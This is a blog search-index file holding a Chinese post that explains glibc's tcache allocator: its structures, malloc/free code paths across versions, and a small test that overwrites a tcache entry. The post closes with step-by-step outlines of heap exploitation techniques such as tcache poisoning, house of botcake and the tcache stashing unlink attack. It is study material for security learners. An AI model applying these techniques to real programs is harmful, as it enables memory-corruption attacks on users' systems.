@@ -1,0 +1,708 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+    
+    <entry>
+      <title><![CDATA[tcache_note]]></title>
+      <url>/2020/08/21/tcache-note/</url>
+      <content type="html"><![CDATA[<p>tache是glibc2.26中引入的一种新的缓存技术，它为每一个线程创建一个缓冲区域，和fastbin很像也是单链表结构。需要注意的是它们总共64个bin，每个bin之间相差16字节（32位是8字节），所以tcahce的范围是0x20-0x410，也就是非large chunk的范围 ，并且每个链表最多存放7个，超出的部分就使用之前的管理方式。</p>
+<h1 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h1><p>tcache虽然在性能上有不错的提升但是也带来了很多的安全问题。所以2.26之后每个版本tcache的结构体和检查机制都有些微的改动。这里就主要提两个版本2.29和2.26。</p>
+<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="class">&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  <span class="comment">//这个指针在2.29才之后才出现主要目的是为了检查double free</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#125; tcache_entry;</span></pre></td></tr></table></figure>
+<p>tcache_entry是用于管理tcache的结构体，next的指针相当于fastbin的fd指向下一个chunk，但是不同的是这里的指针指向的是数据地址，而fastbin指向的是chunk头的位置。key指针存放的是tcache_perthread_struct的地址（这个结构等会介绍），在每次free的时候都会检查被释放的块的key值是否是tcache_perthread_struct的地址，如果是则检查相应的bin中所有块的地址是否和将要释放的块相同。</p>
+<h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="class">&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS]; <span class="comment">//这里在2.30之后char类型变成了uint16_t</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#125; tcache_perthread_struct;</span></pre></td></tr></table></figure>
+<p>每个线程都会维护一个自己的tcache_perthread_struct，它用来管理自己线程的tcache。需要注意的是这个结构存放在堆上，所以第一次malloc时会先申请一段空间来存放这个结构体（2.30之前是：0x250字节，到目前版本2.32是：0x290字节）。</p>
+<h1 id="相关代码的改动"><a href="#相关代码的改动" class="headerlink" title="相关代码的改动"></a>相关代码的改动</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> <span class="keyword">size_t</span> tbytes = request2size (bytes);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> MAYBE_INIT_TCACHE ();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> DIAG_PUSH_NEEDS_COMMENT;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     &amp;&amp; tcache</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">   &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">     <span class="keyword">return</span> tcache_get (tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"> DIAG_POP_NEEDS_COMMENT;</span></pre></td></tr></table></figure>
+<p>request2size这个函数存在漏洞（cve-2017-17426），所以在2.27之后换成了checked_request2size函数，这里不多做介绍。MAYBE_INIT_TCACHE是初始化tcache，向可用的arena中申请一段存放tcache_perthread_struct的空间并初始化该空间。之后的检查tcache-&gt;entries[tc_idx] != NULL 也在2.30之后变成了tcache-&gt;counts[tc_idx] &gt; 0。感觉这个地方在2.29之前可用利用一下，可以直接修改成任意地址并且counts相应位置的值会变成-1，可惜在2.30后变成检查count值了，不过tcache_get内的检查删掉了。<br>测试代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> * p = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *tcache_struct_addr = (<span class="keyword">void</span> *)p - <span class="number">0x290</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"tcahce_struct_addr: %x\n"</span>, tcache_struct_addr);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> * tcache_entry_0x100addr = tcache_struct_addr + <span class="number">128</span> + <span class="number">14</span>*<span class="number">8</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">*tcache_entry_0x100addr = p;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span></pre></td></tr></table></figure>
+<figure class="image-box">
+                <img src="/img/posts-img/tcache_note-1.png" alt="图1" title="" class="">
+                <p>图1</p>
+            </figure>
+
+<h2 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  --(tcache-&gt;counts[tc_idx]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  e-&gt;key = <span class="literal">NULL</span>;<span class="comment">//2.29之后出现的用于检测double free</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>只有简单的检查了下tache的索引值和指针，然后就取出相应位置的第一个chunk，并且计数减1.</p>
+<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  mchunkptr tc_victim;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    *fb = tc_victim-&gt;fd;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">break</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">      tcache_put (tc_victim, tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>这个是fastbin中添加的代码，当从fastbin中取出chunk时，如果这个bin中还有剩余chunk并且tcache没有满则放入到tcache中，注意这时tcache中chunk的顺序和fast bin时相反的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  mchunkptr tc_victim;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">      bck = tc_victim-&gt;bk;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    set_non_main_arena (tc_victim);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">      bin-&gt;bk = bck;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">      bck-&gt;fd = bin;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">      tcache_put (tc_victim, tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>接下来是small bin中的代码，它和fastbin类似，同样是添加到tcache满为止，不过注意这里的unlink没有做任何检查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"> INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">tcache_nb = nb;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> return_cached = <span class="number">0</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">tcache_unsorted_count = <span class="number">0</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache_nb</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  tcache_put (victim, tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  return_cached = <span class="number">1</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">continue</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  ++tcache_unsorted_count;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (return_cached</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (return_cached)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>这个是unsorted bin中的代码，先判断size是否属于tcache，在遍历unsorted bin时优先将符合的块放入到tcache中，最后再从tcache中取出第一个返回给用户。</p>
+<h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check to see if it's already in the tcache.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="comment">   coincidence before aborting.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    tcache_entry *tmp;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">     tmp;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">     tmp = tmp-&gt;next)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (tmp == e)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">  &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">  &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    tcache_put (p, tc_idx);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">  &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">  &#125;</span></pre></td></tr></table></figure>
+<p>之后是_int_free的部分，在2.29的版本做了较大的改动，之前这里几乎没有检查只有简单的判断是否属于tcache范围和是已满。2.29这里还多了一个判断key是否指向tcache_perthread_struct，如果是的则遍历所有的chunk看这个指针是否已经释放过了。</p>
+<h2 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="comment">     detect a double free.  */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  e-&gt;key = tcache;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  tcache-&gt;entries[tc_idx] = e;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>tcache_put没啥好说的，就给key赋值，剩下的和tcache_get操作相反。</p>
+<h1 id="相关攻击"><a href="#相关攻击" class="headerlink" title="相关攻击"></a>相关攻击</h1><p>这里有个要注意的地方，由于tcache的主要取操作是在_libc_malloc的代码中，所以调用calloc时并不会优先使用tcache，但是_int_malloc中tcache中的相关代码还是会执行的。</p>
+<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><p>2.26-2.28时没有做任何double free相关的检查，所以直接free就行了。2.29之后就没有办法了，甚至连a-b-a的方法也用不了。</p>
+<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>由于tcache_get没有任何检查，可以直接修改tcache_bin中chunk的fd指针，几乎是任意地址写。</p>
+<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>tcache在free和malloc时没有对相邻的堆块进行检查，所以可以通过free一个size可控的地址，达到对内存写的目的。</p>
+<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p>这个方法类似overlaping，需要有double free漏洞才行。<br>1.free7个0x100大小的块将tcache填满。<br>2.free a,b两个0x100且相邻的块并使其在unsorted bin中合并。<br>3.malloc(0x100)减少tcahce的数量给之后再次free(b)腾位置。<br>4.利用double free将b放入到tcache bin中的首位。<br>5.malloc(0x120)或者稍大点的块，这时申请的块是a,b合并后切分出来的，通过overlaping覆盖b中的fd值达到任意地址写。</p>
+<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>这个的利用比较复杂，需要调用calloc并且需要将伪造堆块的bk指针指向一段可写的位置。<br>1.首先free 7个0x100的块将tcache填满。<br>2.free两个不相邻大小为0x100的a,b块，使其进入到unsorted bin中。<br>3.申请一个稍大的块，让a,b进入small bin中。<br>4.申请两个0x100的块，此时tcache剩下5个块。<br>5.修改b中的bk值指向伪造的堆块，调用calloc，利用tcache的机制将b和伪造的堆块地址放入到tcache中。<br>6.malloc出来的块就是伪造的堆块</p>
